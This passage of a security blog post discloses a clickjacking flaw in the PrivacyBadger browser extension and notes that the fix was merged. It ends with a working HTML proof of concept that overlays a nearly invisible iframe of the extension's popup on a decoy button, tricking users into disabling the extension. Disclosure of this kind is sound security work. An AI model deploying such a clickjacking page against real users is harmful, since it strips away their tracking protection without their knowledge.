<code>web_accessible_resources</code> run with the ambient authority of the
extension: they can alter state, load other resources, and modify the
browser in certain ways. If a document in <code>web_accessible_resources</code>
can perform any interesting behavior, an attacker can embed it in a
webpage and trick visitors into triggering it.
</p>

<p>
In this case, in PrivacyBadger, the contents of the directory <code>skin/</code>
were <code>web_accessible_resources</code>. By loading
<code>skin/popup.html</code>, the document that gets rendered when you
click the the PrivacyBadger icon in the browser, in an iframe we could
fool the user into clicking "Disable PrivacyBadger for this Website",
opening up the user to additional tracking and undermining the
function of PrivacyBadger.
</p>

<div class="figure">
  <video loop autoplay muted src="clickjacking-privacy-badger/badger-fade.webm">
  </video>
  <p>
    A video demonstrating the transparent iframe overlaid over an attacker-controlled
    website, fading in and out. (In a real-life scenario an attacker could make it
    totally transparent, i.e. invisible).
</div>


<p>
The fix is easy: remove <code>/skin/*</code> from the
<code>web_accessible_resources</code>. Blake wrote <a href="https://github.com/EFForg/privacybadger/pull/1413">a PR for that</a> and it was
merged on June 5th, a day after we reported the issue.
</p>

<p>
The proof-of-concept Blake and I wrote is as follows. It will work on
release <a href="https://github.com/EFForg/privacybadger/releases/tag/release-2017.5.9"><code>2017.5.9</code></a>or earlier.
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;style&gt;
iframe {
    width: 430px;
    height: 300px;
    opacity: 0.01;
    float: top;
    position: absolute;
}

#stuff {
    float: top;
    position: absolute;
}

button {
    float: top;
    position: absolute;
    top: 168px;
    left: 100px;
}

&lt;/style&gt;

&lt;div id="stuff"&gt;
    &lt;h1&gt;
    Click the button
    &lt;/h1&gt;
    &lt;button id="button"&gt;
      click me
    &lt;/button&gt;
&lt;/div&gt;

&lt;iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html"&gt;
&lt;/iframe&gt;
</pre>
</div>
]]></description>
</item>
</channel>
</rss>
